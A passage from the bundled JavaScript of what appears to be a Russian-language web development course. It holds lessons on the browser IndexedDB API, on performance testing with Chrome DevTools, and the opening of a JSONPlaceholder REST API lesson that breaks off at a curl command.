запись)\n\n![](https://cdn.glitch.com/a4e0a9fd-ea7b-47cf-b52a-48fd6359c559%2FindexedDB-1.gif)\n\n_________________________________\n\n#### ![ico-20 icon] get\n\nВернемся к исходному состоянию базы данных **users** из предыдущего примера,\nт.е. к версии 1 с одним хранилищем и двумя индексами\n\n\"Вытянем\" из хранилища **users** запись по ключу 2:\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nindexedDB.open('users').onsuccess = event => {\n  const store = event.target.result\n    .transaction(['userStore'])\n    .objectStore('userStore')\n  const request = Object.assign(store.get(2), {\n    onsuccess: event => console.log(event.target.result),\n    onerror: event => console.warn(event.target.error)\n  })\n}\n~~~\n\nВ результате выполнения запроса в консоли мы увидим:\n\n~~~console\n▼ {name: \"Andry\", birthYear: 1998, family: {…}, hobby: Array(1)}\n    birthYear: 1998\n  ► family: {mother: {…}, father: {…}}\n  ► hobby: [\"dancing\"]\n    name: \"Andry\"\n  ► __proto__: Object\n~~~\n\n__________________________________________________\n\n#### ![ico-20 icon] add\n\nСоздадим объект **user**:\n\n~~~js\nconst user = {\n  name: 'Piter',\n  birthYear: 2001,\n  family: {\n    father: {\n      birthYear: 1980,\n      name: 'Philip',\n      speciality: 'worker',\n    },\n    mother: {\n      birthYear: 1981,\n      name: 'Jane',\n      speciality: 'painter'\n    }\n  },\n  hobby: ['travelling', 'fishing']\n}\n~~~\n\nи добавим нового юзера в базу данных:\n( при создании транзакции нужно установить режим **~readwrite~** )\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nindexedDB.open('users')\n  .onsuccess = event => {\n    const store = event.target.result\n      .transaction(['userStore'], 'readwrite')\n      .objectStore('userStore')\n    const request = Object.assign(store.add(user), {\n      onsuccess: event => console.log(event.target.result),\n      onerror: event => console.warn(event.target.error)\n    })\n  }\n~~~\n\nВ консоли мы увидим ключ добавленной записи (3)\n\n__________________________________________________\n\n#### ![ico-20 icon] getAll\n\n◘◘![ico-20 cap] ** 4**◘◘\n\n~~~js\nindexedDB.open('users').onsuccess = event => {\n  const store = event.target.result\n    .transaction(['userStore'], 'readwrite')\n    .objectStore('userStore')\n  const request = Object.assign(store.getAll(), {\n    onsuccess: event => console.log(event.target.result),\n    onerror: event => console.warn(event.target.error)\n  })\n}\n~~~\n\nВ консоли мы увидим\n\n~~~console\n▼  (3) [{…}, {…}, {…}]\n  ► 0: {name: \"Stephan\", birthYear: 1995, family: {…}, hobby: Array(2)}\n  ► 1: {name: \"Andry\", birthYear: 1998, family: {…}, hobby: Array(1)}\n  ► 2: {name: \"Piter\", birthYear: 2001, family: {…}, hobby: Array(2)}\n    length: 3\n  ► __proto__: Array(0)\n~~~\n\n_____________________________________________________\n\n#### ![ico-20 icon] delete\n\nТеперь удалим запись с ключом 2, используя метод **delete** хранилища\n( при создании транзакции нужно установить режим **~readwrite~** )\n\n◘◘![ico-20 cap] ** 5**◘◘\n\n~~~js\nindexedDB.open('users')\n  .onsuccess = event => {\n    const store = event.target.result\n       .transaction(['userStore'], 'readwrite')\n       .objectStore('userStore')\n    const request = Object.assign(store.delete(2), {\n      onsuccess: event => console.log(event.target.result),\n      onerror: event => console.warn(event.target.error)\n    })\n  }\n~~~\n\n____________________________________________________\n\n### ![ico-20 icon] Интерфейс IDBIndex\n\nДля получения ссылки на объект индекса хранилища по его имени\nинтерфейс **IDBObjectStore**\nпредоставляет нам метод **~index~**\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\nindexedDB.open('users').onsuccess = event => {\n  const index = event.target.result\n    .transaction(['userStore'], 'readwrite')\n    .objectStore('userStore')\n    .index('hobbyIndex')\n  console.log(index)\n}\n~~~\n\nВ переменной **index** мы получили ссылку на объект интерфейса **IDBIndex**:\n\n~~~console\n▼ IDBIndex {name: \"hobbyIndex\", objectStore: IDBObjectStore, keyPath: \"hobby\", multiEntry: true, unique: false}\n    keyPath: \"hobby\"\n    multiEntry: true\n    name: \"hobbyIndex\"\n  ► objectStore: IDBObjectStore {name: \"userStore\", keyPath: null, indexNames: DOMStringList, transaction: IDBTransaction, autoIncrement: true}\n    unique: false\n  ► __proto__: IDBIndex\n~~~\n\nКак мы уже знаем, у этого объекта есть унаследованные методы **count**, **get**, **getAll**, **getKey**, **getAllKeys**, **openCursor** и **openKeyCursor**\n\nДля того, чтобы лучше изучить работу этого интерфейса, добавим еще несколько записей в базу данных, у которых в массиве **hobby** будет значение **footbal**\n\n~~~js\nconst user = {\n  name: 'Иван',\n  birthYear: 2004,\n  family: {\n    father: {\n      birthYear: 1981,\n      name: 'Василий',\n      speciality: 'безработный',\n    },\n    mother: {\n      birthYear: 1982,\n      name: 'Маргарита',\n      speciality: 'швея'\n    }\n  },\n  hobby: ['fishing', 'footbal']\n}\n\nindexedDB.open('users').onsuccess = event => {\n  const store = event.target.result\n    .transaction(['userStore'], 'readwrite')\n    .objectStore('userStore')\n  const request = Object.assign(store.add(user), {\n    onsuccess: event => console.log(event.target.result),\n    onerror: event => console.warn(event.target.error)\n  })\n}\n~~~\n\n**hobbyIndex**\n\n![](https://cdn.glitch.com/a4e0a9fd-ea7b-47cf-b52a-48fd6359c559%2FindexedDB-index-2.png)\n\nКогда ссылка на объект индекса \"в наших руках\", мы можем воспользоваться интерфейсом этого объекта\n\nНапилим функцию **getDataByIndex**\n\n~~~js\nconst **getDataByIndex** = (indexName, method, keyVal) => indexedDB.open('users')\n  .onsuccess = event => {\n    const index = event.target.result\n      .transaction(['userStore'], 'readwrite')\n      .objectStore('userStore')\n      .index(indexName)\n    Object.assign(index[method](keyVal), {\n      onsuccess: event => console.log(event.target.result),\n      onerror: event => console.warn(event.target.error)\n    })\n  }\n~~~\n\nЭта функция принимает три агрумента:\n• имя объекта индекса\n• метод интерфейса **IDBIndex**\n• значение ключа индекса, по которому будут выбираться данные их хранилища\n\n____________________________\n\nИспользуем метод **get** интерфейса **IDBIndex**\nдля получения _первой_ из всех записей в хранилище **userStore**,\nв которых в массиве **hobby** есть значение **footbal**:\n\n◘◘![ico-20 cap] ** 7**◘◘\n\n~~~js\ngetDataByIndex('hobbyIndex', 'get', 'footbal')\n~~~\n\nВ консоли мы увидим:\n\n~~~console\n▼ {name: \"Stephan\", birthYear: 1995, family: {…}, hobby: Array(2)}\n    birthYear: 1995\n  ► family: {mother: {…}, father: {…}}\n  ► hobby: (2) [\"footbal\", \"fishing\"]\n    name: \"Stephan\"\n  ► __proto__: Object\n~~~\n\n____________________________\n\nА теперь используем метод **getAll** интерфейса **IDBIndex**\nдля получения всех записей в хранилище **userStore**,\nу которых в массиве **hobby** есть значение **footbal**:\n\n◘◘![ico-20 cap] ** 8**◘◘\n\n~~~js\ngetDataByIndex('hobbyIndex', 'getAll', 'footbal')\n~~~\n\nВ консоли мы увидим:\n\n~~~console\n▼ (2) [{…}, {…}]\n  ► 0: {name: \"Stephan\", birthYear: 1995, family: {…}, hobby: Array(2)}\n  ► 1: {name: \"Иван\", birthYear: 2004, family: {…}, hobby: Array(2)}\n    length: 2\n  ► __proto__: Array(0)\n~~~\n____________________________\n\nПолучим **ключ** первой из всех записей в хранилище **userStore**,\nв которых в массиве **hobby** есть значение **footbal**:\n\n◘◘![ico-20 cap] ** 9**◘◘\n\n~~~js\ngetDataByIndex('hobbyIndex', 'getKey', 'footbal')\n~~~\n\nВ консоли мы увидим число 1 - это ключ записи\n____________________________________________________\n\nС помощью метода **getAllKeys** интерфейса **IDBIndex**\nполучим ключи всех записей в хранилище **userStore**,\nв которых в массиве **hobby** есть значение **footbal**:\n\n◘◘![ico-20 cap] **10**◘◘\n\n~~~js\ngetDataByIndex('hobbyIndex', 'getAllKeys', 'footbal')\n~~~\n\nВ консоли мы увидим ключи:\n\n~~~console\n▼ (2) [1, 4]\n~~~\n\n________________________________________"},6043:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] indexedDB\n\n_____________________________________\n\n^^Indexed Database^^\n**NoSQL**\nИндексируемая транзакционная объектно-ориентированная база данных\nна стороне клиента,\nязыком запросов которой является JavaScript\n__________________________________________\n\n^^База данных - это совокупность хранилищ данных и интерфейсов доступа к ним^^\n__________________________________________\n\n![ico-20 speach] Мы начинаем знакомство с низкоуровневым API,\nдающим нам возможность хранить на клиенте значительные объемы структурированных данных\nСтруктуры данных могут быть любыми, ![ico-20 warn] если в них нет _циклических ссылок_\n^^(можно, в том числе, хранить файлы и blob-объекты)^^\n^^"низкоуровневый" означает, что все придется писать много кода, так что готовьтесь к многословным примерам^^\n\n![ico-20 speach] Тот факт, что IndexedDB является объектно-ориентированной базой данных,\nозначает для нас использования привычных пар "ключ-значение",\nкогда каждая запись в базе данных однозначно идентифицируется ключом,\nкак и свойства обычного объекта,\nи является, по сути, свойством обычного объекта,\nтолько называть этот объект мы будем _хранилищем_ (store)\n![ico-20 speach] В процессе работы с этим API мы будем делать запросы к базе данных, используя JS\n^^в отличие от баз данных в виде набора таблиц с языком запросов **SQL**,^^\n^^здесь никаких таблиц не будет - только объекты,^^\n^^и никакого SQL - сплошной JS^^\n^^короче, все родное и бесконечно близкое... ![ico-20 smile]^^\n\n![ico-20 speach] Данное API работает в режиме _same-origin policy_ (политики одного источника)\n^^так же, как куки и localStorage, экземпляр indexedDB доступен только с того домена / протокола / порта, с которого был создан^^\n^^можно создать несколько баз данных **indexedDB**, но их имена должны быть уникальны в пределах домена^^\n\n![ico-20 speach] Интерфейс IndexedDB работает **асинхронно**\n^^приготовьтесь, будет много асинхронных запросов и колбэков ![ico-20 smile]^^\n\n![ico-20 speach] Экземпляр indexedDB является **_транзакционной_** базой данных\n^^Все запросы к базе данных выполняются в рамках **транзакций**^^\n^^( транзакции можно рассматривать как объекты-контейнеры для объектов-запросов )^^\n\nНо прежде, чем мы продолжим нашу экскурсию по ухабам интерфейса **IDBDatabase**,\nдавайте посмотрим, как отслеживать наши операции с базой данных в отладчике\n\n___________________________________________________\n\n^^^[Chrome DevTools]\n\nВ **Chrome DevTools** есть возможность просматривать данные IndexedDB\n( раздел **IndexedDB** вкладки **Application** )\n\n![](https://cdn.glitch.com/a4e0a9fd-ea7b-47cf-b52a-48fd6359c559%2FindexedDB-1.png)\n\n^^^\n\nВ **Mozilla Firefox** это выглядит так:\n\n^^^[Firefox ( Mozilla )]\n\n![](https://cdn.glitch.com/a4e0a9fd-ea7b-47cf-b52a-48fd6359c559%2FindexedDB-mozila.png)\n\n^^^\n___________________________________________________\n\n## ![ico-25 icon] Интерфейс IDBFactory API\n\n**indexedDB** - это интерфейс **IDBFactory**\n\nВыведем в консоль объект **indexedDB**\n\n~~~console\n▼ IDBFactory\n  ▼ __proto__: IDBFactory\n      ► cmp: ƒ cmp()\n      ► databases: ƒ databases()\n      ► deleteDatabase: ƒ deleteDatabase()\n      ► open: ƒ open()\n      ► constructor: ƒ IDBFactory()\n        Symbol(Symbol.toStringTag): "IDBFactory"\n      ► __proto__: Object\n~~~\n\nЭтот интерфейс позволяет:\n\n• **open** - установить соединение с базой данных по ее имени\n• **databases** - получить перечень имен и версий всех баз данных, существующих для данного домена\n• **deleteDatabase** - удалить базу данных по ее имени\n\n![](https://cdn.glitch.com/a4e0a9fd-ea7b-47cf-b52a-48fd6359c559%2FIDBFactory.gif)\n\n______________________________________________\n\n### ![ico-20 icon] IDBRequest\n\nВ процессе работы с базой данных нам придется делать запросы к API\n\nЛюбой запрос является экземпляром **IDBRequest**, и наследует от него свойства:\n\n| ![ico-20 green-ok] | **^^onsuccess^^** | **^^result^^** |\n| ![ico-20 error]    | **^^onerror^^**   | **^^error^^** |\n\nСвойство ![ico-20 green-ok] **result** будет содержать результат запроса,\nкогда запрос завершится ( произойдет событие **success** )\n^^"Ловить" результат запроса нужно в колбэке **onsuccess**^^\n^^Если запрос не завершен, попытка прочитать свойство **result**^^\n^^будет приводить к исключению^^\n\nСвойство ![ico-20 green-ok] **transaction** объекта запроса\nявляется ссылкой на транзакцию, в рамках которой выполняется запрос\n\n_____________________________________\n\n### ![ico-20 icon] indexedDB.open\n\nСоздание запроса на соединение с базой данных\n![ico-20 warn] Метод **open** создает _объект запроса_ **IDBOpenDBRequest**\nи возвращает ссылку _на него_\n\n![ico-20 green-ok] Первый аргумент метода ( обязательный ) - имя базы данных ( строка )\n![ico-20 green-ok] Второй аргумент ( опциональный ) - версия базы данных ( целое число )\n\nВ случае благополучного завершения запроса ( ![ico-20 green-ok] событие **success** )\nв его свойстве **result** будет ссылка на объект интерфейса **IDBDatabase**,\nа в случае ошибки запроса в его свойстве ![ico-20 error] **error** будет объект ошибки\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nconst request = indexedDB.open(\'sampleDB\', 1)\n\nrequest.onsuccess = event => console.log(event.target.result)\nrequest.onerror = event => console.warn(event.target.error)\n~~~\n\nДля компактности можно сразу упаковать объект запроса необходимыми колбэками:\n\n~~~js\nconst request = Object.assign(indexedDB.open(\'sampleDB\'), {\n  onsuccess: event => console.log(event.target.result),\n  onerror: event => console.warn(event.target.error)\n})\n~~~\n\nПосле успешного завершения запроса (событие **success**) в консоли мы увидим экземпляр **IDBDatabase**:\n\n~~~console\n▼ IDBDatabase {name: "sampleDB", version: 1, objectStoreNames: DOMStringList, onabort: null, onclose: null, …}\n    name: "sampleDB"\n  ► objectStoreNames: DOMStringList {length: 0}\n    onabort: null\n    onclose: null\n    onerror: null\n  ► onversionchange: null\n    version: 1\n  ► __proto__: IDBDatabase\n~~~\n\nЭкземпляр **IDBDatabase** представляет собой интерфейс, или сервисную оболочку,\nза которой "прячется" сама база данных в виде набора именованных хранилищ\n\nт.е. сам экземпляр **IDBDatabase** не хранит данные, а опосредует доступ к ним\n\n^^Данные хранятся на диске пользователя, откуда API их читает и куда записывает^^\n^^Поэтому интерфейс ~IDBFactory API~ работает асинхронно:^^\n^^дисковые операции чтения / записи  отнюдь не являются "мгновенными",^^\n^^и достаточно варьируют в продолжительности^^\n\n_________________________________\n\n#### ![ico-20 icon] upgradeneeded\n\nОбъект запроса на соединение с базой данных имеет еще одно событие - ![ico-20 warn] **~upgradeneeded~**\nЭто событие возникает в двух случаях:\n![ico-20 warn] если соединение с базой данных устанавливается впервые,\nт.е. такой базы данных еще не существует, и она будет создана в результате запроса\n![ico-20 warn] если в запросе указана более высокая версия базы данных,\nчем у сохраненной на диске пользователя\n\nСоответствующий коллбэк запроса **onupgradeneeded**\nпозволяет проводить манипуляции со схемой базы данных,\nт.е. создавать (удалять) хранилища и индексы\n\nАналогичное событие, но с другим названием, есть у экземпляра **IDBDatabase**,\nкоторый создается в результате запроса (свойство **result** объекта запроса)\nЭто событие **~versionchange~**\nСоответствующий колбэк этого объекта называется **~onversionchange~**\n\nРазберем эти колбэки на примере\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nconst callback = event => console.log(event.type)\nconst errorHandler = event => console.warn(event.target.error)\n\nconst request = Object.assign(indexedDB.open(\'sampleDB\'), {\n  onsuccess: event => {\n    callback(event)\n    event.target.result.onversionchange = callback\n  },\n  onupgradeneeded: event => {\n    callback(event)\n    event.target.result.onversionchange = callback\n  },\n  onerror: errorHandler\n})\n~~~\n\nПосле выполнения этого кода в консоли будет два события:\n\n~~~console\nupgradeneeded\nsuccess\n~~~\n\nА теперь выполним в консоли следующий код:\n\n~~~js\nObject.assign(indexedDB.open(\'sampleDB\', 2), {\n  onsuccess: callback,\n  onupgradeneeded: callback,\n  onerror: errorHandler\n})\n~~~\n\nПосле выполнения этого кода в консоли будет только одно событие:\n\n~~~console\nversionchange\n~~~\n\n^^Далее экспериментировать не стоит, поскольку API будет блокировать запросы до тех пор, пока мы не закроем соединение с базой данных^^\n\nИтак, мы выяснили, что когда мы запрашиваем соединение с базой данных,\nмогут "сработать" два колбэка,\nв которых можно изменять схему базы данных,\nт.е. создавать (удалять) хранилища и индексы\n\nПервый колбэк - это **onupgradeneeded** самого запроса,\nа второй - это **onversionchange** интерфейса базы данных, или результата запроса\n\nДавайте посмотрим на этот интерфейс, т.е. на то, что мы получили в свойстве **result** запроса:\n\n~~~console\n▼ IDBDatabase { name: "sampleDB", version: 2, objectStoreNames: DOMStringList, onabort: null, onclose: null, …}\n    name: "sampleDB"\n  ► objectStoreNames: DOMStringList {length: 0}\n    onabort: null\n    onclose: null\n    onerror: null\n    onversionchange: null\n    version: 2\n  ► __proto__: IDBDatabase\n~~~\n\nНадо сказать, что сам экземпляр ~IDBDatabase~ не особо содержателен:\n• у него есть собственное свойство **objectStoreNames**,\n• номер версии базы данных - **version**,\n• и свойства-ссылки на обработчиков событий **onabort**, **close**, **error** и **versionchange**...\nИнтереснее заглянуть ему "под капот",\nт.е. посмотреть на унаследованные свойства и методы этого интерфейса:\n\n~~~~console\n▼ IDBDatabase {…}\n  ► close: ƒ close()\n  ► createObjectStore: ƒ createObjectStore()\n  ► deleteObjectStore: ƒ deleteObjectStore()\n    name: (...)\n    objectStoreNames: (...)\n    onabort: (...)\n    onclose: (...)\n    onerror: (...)\n    onversionchange: (...)\n  ► transaction: ƒ transaction()\n    version: (...)\n  ► constructor: ƒ IDBDatabase()\n    Symbol(Symbol.toStringTag): "IDBDatabase"\n  ► get name: ƒ name()\n  ► get objectStoreNames: ƒ objectStoreNames()\n  ► get onabort: ƒ onabort()\n  ► set onabort: ƒ onabort()\n  ► get onclose: ƒ onclose()\n  ► set onclose: ƒ onclose()\n  ► get onerror: ƒ onerror()\n  ► set onerror: ƒ onerror()\n  ► get onversionchange: ƒ onversionchange()\n  ► set onversionchange: ƒ onversionchange()\n  ► get version: ƒ version()\n  ► __proto__: EventTarget\n~~~~\n\nЗдесь привлекают внимание следующие методы:\n\n![ico-20 green-ok] метод **close**\n![ico-20 green-ok] метод **createObjectStore**\n![ico-20 green-ok] метод **deleteObjectStore**\n![ico-20 green-ok] метод **transaction**\n\nС методом **close** все предельно просто: он закрывает соединение с базой данных:\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nconst openDB = dbName => new Promise((resolve, reject) => Object.assign(indexedDB.open(dbName), {\n  onsuccess: resolve(event.target.result),\n  onerror: reject(event.target.error)\n}))\n\nopenDB().then(db => { console.log(db); db.close() }, err => console.warn(err))\n~~~\n\nа вот остальные методы разберем немного позже,\nпоскольку нужно завершить изучение интерфейса ~IDBFactory~\n\n_______________________________________________\n\n### ![ico-20 icon] indexedDB.databases\n\nИнтерфейс ~IDBFactory~ предоставляет нам возможность получить перечень всех баз данных, которые уже существуют для домена:\n\n~~~js\nindexedDB.databases()\n  .then(response => console.log(response))\n~~~\n\nВ консоли будет массив с именами и версиями всех существующих баз данных:\n\n~~~console\n▼ (2) [{…}, {…}]\n  ► 0: {name: "sampleDB", version: 2}\n  ► 1: {name: "users", version: 1}\n    length: 2\n  ► __proto__: Array(0)\n~~~\n\n______________________________________________________________\n\n### ![ico-20 icon] indexedDB.deleteDatabase\n\nИнтерфейс ~IDBFactory~ позволяет сделать запрос на удаление базы данных с указанным именем\n\n~~~js\nconst callback = event => console.log(event.type)\n\nObject.assign(indexedDB.deleteDatabase(\'sampleDB\'), {\n  onerror: callback,\n  onsuccess: callback,\n  onupgradeneeded: callback,\n  onblocked: callback\n})\n~~~\n\nВозвращает объект:\n\n~~~console\n▼ IDBOpenDBRequest {onblocked: ƒ, onupgradeneeded: ƒ, source: null, transaction: null, readyState: "pending", …}\n    error: null\n  ► onblocked: event => console.log ( event.type )\n  ► onerror: event => console.log ( event.type )\n  ► onsuccess: event => console.log ( event.type )\n    onupgradeneeded: event => console.log ( event.type )\n    readyState: "done"\n    result: undefined\n    source: null\n    transaction: null\n  ► __proto__: IDBOpenDBRequest\n~~~\n\n^^это объект запроса на соединение с базой данных, которому мы можем "навешивать" колбэки^^\n\nпосле чего асинхронно происходит удаление базы данных\nЕсли удаление базы данных завершается успешно,\nто на объекте запроса ( IDBOpenDBRequest ) происходит событие ![ico-20 green-ok] **success**,\nно свойство **result** при этом будет иметь значение **~undefined~**\nЕсли удаление базы данных завершается ошибкой,\nто на объекте запроса ( IDBOpenDBRequest ) происходит событие ![ico-20 error] **error**\n\n![ico-20 warn] Событие **upgradeneeded** является триггером для запуска транзакции **versionchange**\nна экземпляре **IDBDatabase**\n\n◘◘![ico-20 cap] ** 4**◘◘\n\n~~~js\nconst callback = event => console.log(event.type, event.target.result ? event.target.result.name : \'...\')\nconst errorHandler = event => console.warn(event.target.error)\n\nconst request = Object.assign(indexedDB.open(\'sampleDB\'), {\n  onsuccess: event => {\n    callback(event)\n    event.target.result.onversionchange = callback\n  },\n  onupgradeneeded: event => callback,\n  onerror: errorHandler\n})\n~~~\n\nВ консоли будет:\n\n~~~console\nupgradeneeded sampleDB\nsuccess sampleDB\n~~~\n\nДавайте теперь без перезагрузки страницы выполним запрос на удаление базы данных **sampleDB**:\n\n~~~js\nObject.assign(indexedDB.deleteDatabase(\'sampleDB\'), {\n  onerror: event => console.log(event.type),\n  onsuccess: event => console.log(event.type),\n  onupgradeneeded: event => console.log(event.type),\n  onblocked: event => console.log(event.type)\n})\n~~~\n\nЕсли в момент создания запроса с базой данных было открытое соединение,\nто соответствующий экземпляр **IDBDatabase** получит событие **versionchange**\n\nПоэтому консоли мы увидим:\n\n~~~console\nversionchange ...\nblocked\n~~~\n\nЕсли же после создания базы данных **sampleDB** перезагрузить страницу,\nа потом запустить код удаления базы данных,\nто в консоли будет только одно событие:\n\n~~~console\nsuccess\n~~~\n\n_____________________________________________________\n\nИтак, подведем итог:\n\n| **IDBFactory** | **open**  | => | **IDBDatabase** |\n| ^^интерфейс^^  | ^^метод^^ |    | ^^интерфейс^^   |\n'},38105:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# Тестирование производительности\n\n## ![ico-30 study] RAIL\n\nСколько приложение \"кушает\" памяти на клиенте ?\n![ico-20 warn] Если объем используемой памяти растет пропорционально времени работы приложения, то имеют место утечки памяти\n![ico-20 warn] Если приложение часто \"подвисает\" на секунду-две, то, скорее всего, слишком часто запускается сборщик мусора, чтобы очистить память от ненужных преременных\n\n**RAIL** - это модель производительности,  ориентированная на пользователя\nОна разбивает взаимодействие пользователя на ключевые действия:\n\n|  **Response**  |  **Animation**  |  **Idle**  |  **Load**  |\n\nОсновные характеристики производительности с точки зрения пользователя:\n\n![ico-20 green-ok] Скорость загрузки страницы\n• время отрисовки ( визуализации ) контента\n• время до того, как страница станет интерактивной, т.е. начнет регировать на действия пользователя\n![ico-20 green-ok] плавность анимации ( желательно 60fps )\n![ico-20 green-ok] интерактивность страницы\nвремя от момента, когда пользователь выполнил какое-то действие на странице, до момента, когда приложение отреагирует на это действие, должно быть в пределах 100ms\nболее длительная задержка будет раздражать\n\n**Chrome DevTools** предоставляет подробный анализ всего, что происходит во время загрузки и запуска приложения\n\n_____________________________________________________________\n\n## ![ico-25 icon] JavaScript Profiler\n\nВ новой вкладке браузера запустите приложение, которое вы хотите проверить\nОткройте вкладку **JavaScript Profiler** в Chrome DevTools\n\n![](createPath('images', 'js-profiler.png'))\n\nНачните запись профиля ( нажмите кнопку Start )\nВыполните несколько действий на странице приложения\nОстановите запись  ( нажмите кнопку Stop )\nТеперь можно посмотреть записанный профиль, оценить производительность различных модулей ( функций ) приложения и определить проблемные фрагменты кода\n\n~~~console\n    Self Time                  Total Time                Function\n_______________________________________________________________________\n8092.0 ms                  8092.0 ms                     (iddle)\n1722.9 ms   93.74%         1722.9 ms      93.74%         (program)\n   9.5 ms    0.52%            9.5 ms       0.52%         (garbage collector)\n  10.6 ms    0.58%           10.6 ms       0.58%         fetch\n   6.4 ms    0.35%           21.8 ms       1.18%         parseLine\n   3.5 ms    0.19%           12.2 ms       0.66%         appendChild\n   3.3 ms    0.18%           20.7 ms       1.12%         createCodeSnippet\n   0.1 ms    0.01%            0.1 ms       0.01%         getElementsByClassName\n   ...                      ...                          ...\n~~~\n\n_____________________________________________________________\n\n## ![ico-25 icon] Audits\n\nПерейдите по URL приложения, которое вы хотите проверить\nОткройте вкладку **Audits** в Chrome DevTools\n\n![](createPath('images', 'audits.png'))\n\nDevTools показывает список видов аудита\nОставьте все виды аудита выбранными\nНажмите кнопку Run audits\n\n### ![ico-20 icon] Performance\n\n**First Contentful Paint** - время до того момента, когда первый текст или изображение покажется на странице\n**First Meaningful Paint** - время, необходимое для отображения основного содержимого страницы пользователю\n**Speed Index** - индекс скорости загрузки страницы ( насколько быстро отображается содержимое страницы ): чем меньше значение, тем лучше\n**First CPU Idle** ( First Interactive ) - время первого простоя ЦП\nминимальная интерактивность страницы, \nт.е. когда большая часть, но, возможно, еще не все элементы UI интерактивны, \nстраница реагирует в среднем на большую часть пользовательского ввода в разумные сроки\n**Time to Interactive** - время до интерактивности ( сколько времени требуется странице, чтобы стать интерактивной )\nЭто означает, что:\n• на странице отображен полезный контент ( First Contentful Paint );\n• для наиболее заметных элементов UI обработчики событий зарегистрированы;\n• страница реагирует на действие пользователя в течение 50 миллисекунд\n**Max Potential First Input Delay** ( первая задержка ввода ) - время с момента, когда пользователь впервые взаимодействует со страницей\n(т.е. кликает ссылку, кнопку и т.п.), до момента, когда браузер сможет ответить на это действие\n^^причиной задержки является то, что основной поток браузера может быть занят другой задачей^^\n\nВкладка **Performance** отображает временную шкалу записанного фрагмента работы приложения\n\n![](createPath('images', 'performance.png'))\n\n[%%%Accessibility%%%](https://developers.google.com/web/fundamentals/accessibility/?utm_source=lighthouse&utm_medium=devtools)\n\n_____________________________________________________________\n\n## ![ico-25 icon] Memory\n\n[%%%How to Record Heap Snapshots%%%](https://developers.google.com/web/tools/chrome-devtools/memory-problems/heap-snapshots)\n[%%%Fix Memory Problems%%%](https://developers.google.com/web/tools/chrome-devtools/memory-problems/)\n\nРассмотрим пример кода, производительность которого мы хотим протестировать:\n\n~~~~js\nconst segments = [[1, 8], [2, 3], [4, 7], [5, 6], [2, 8], [3, 7], [4, 6], [1, 5], [1, 6]]\n\nfunction countInnerIntervals (intervals) {\n  const results = []\n\n  intervals\n    .forEach((segment, index, array) => results.push(array.reduce((childs, section) => array.filter(item => item[0] > segment[0] && item[1] < segment[1]).length)))\n  return results\n}\n~~~~\n\nНас интересует не только время выполнения функции **~countInnerIntervals~**, но и расход памяти\n\nДля этого добавим кнопку на страницу:\n\n~~~~js\nconst button = document.body\n  .appendChild(document.createElement('button'))\n\nbutton.innerText = 'Start'\n\nbutton.onclick = function (event) {\n  console.time('segments')\n  const children = countInnerIntervals(segments)\n  console.timeEnd('segments')\n  console.log(children)\n}\n~~~~\n\nПри клике на кнопке вызывается функция **~countInnerIntervals~**\n\nВызов **~countInnerIntervals~** \"заворачивается в ~console.time~/~console.timeEnd~, что позволит нам получить грубую оценку времени выполнения функции\n\n^^^[Результат в консоли]\n\n~~~console\nsegments: 0.536865234375ms\n(9) [5, 0, 1, 0, 4, 2, 0, 1, 1]\nsegments: 0.462158203125ms\n(9) [5, 0, 1, 0, 4, 2, 0, 1, 1]\nsegments: 0.386962890625ms\n(9) [5, 0, 1, 0, 4, 2, 0, 1, 1]\nsegments: 0.55908203125ms\n(9) [5, 0, 1, 0, 4, 2, 0, 1, 1]\nsegments: 0.345947265625ms\n(9) [5, 0, 1, 0, 4, 2, 0, 1, 1]\nsegments: 0.459228515625ms\n(9) [5, 0, 1, 0, 4, 2, 0, 1, 1]\n~~~\n\n^^^\n\nИтак, производительность кода колеблется около пол-милисекунды\n\nВоспользуемся дебаггером для оценки выделяемых ресурсов памяти\n\n[![ico-70 youtube]](https://youtu.be/nDNEiu_xwf0)\n\n• Интерпретатор JavaScript динамически выделяет необходимую память при объявлении переменных\n• Вызовы некоторых функций также ведут к выделению памяти\n• Некоторые методы выделяют память для новых значений или объектов\n\nБлагодаря дебаггеру мы можем убедиться, что у нашего кода расход памяти весьма незначительный:\n\n• код:                    127 килобайт\n• строки:                 100 килобайт\n• массивы:                  2 килобайта\n• типизированные массивы:   1 килобайт\n"},74912:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="## ![ico-30 hw] json-placeholder\n\nДля того, чтобы понять принцип взаимодействия с ~REST API~, воспользуемся бесплатным сервисом **~JSONPlaceholder~**\n\n![](https://garevna.github.io/a-level-js-lessons/src/icons/json-placeholder-logo.png)\n\n[JSONPlaceholder](https://jsonplaceholder.typicode.com/)\n\nЗдесь нам не нужна авторизация, чтобы получить доступ к данным\n\nНо, естественно, мы имеем доступ только на чтение данных\n\n![ico-20 warn] Методы ~POST~, ~PUT~, ~PATCH~, ~DELETE~ только имитируются, фактически мы не можем вносить изменения\n\n_____________________________\n\nПеречень **~endpoint~** ( доступных операций с ресурсами )\n\n^^^[JSONPlaceholder endpoints]\n\n![](https://lh4.googleusercontent.com/kLZ2AUHmxj_tGElT44CKZEDXYqZ9fKOUbciuV5XDf-tRnKiPT0njS1rJnurGUEI7QGfFLNL6UYRa-noaqWmZ1QcUG_7bKBAYWMSLntBIcA-Kop3T3W-y4w1e-moZvWG-ndn0IPJwtWAOmlE)\n\n^^^\n_________________________________________________\n\nНапример, чтобы получить с фейкового сервера все посты, мы должны использовать ссылку:\n\n~https://jsonplaceholder.typicode.com/posts~\n\nПри этом нас не волнуют детали реализации обработки нашего запроса на стороне сервера\n\nСервер также \"свободен\" в выборе или изменении способа обработки запроса и фактического размещения данных\n\nНас связывают с сервером только условные ссылки ( ~endpoints~ ), которые понятны серверу ( чего мы хотим )\n\nГде конкретно лежат нужные нам данные - это не наше дело, как сервер будет их обрабатывать - не наше дело\n\nто есть есть некое соглашение, по которому и взаимодействуют две стороны: клиент и сервер\n\n____________________________________________\n\n### ![ico-25 cap] curl\n\nПолучим все комментарии к первому посту с помощью утилиты ~curl~\n\n![ico-20 bash] Выполним консольную команду\n~~~console\n$ curl 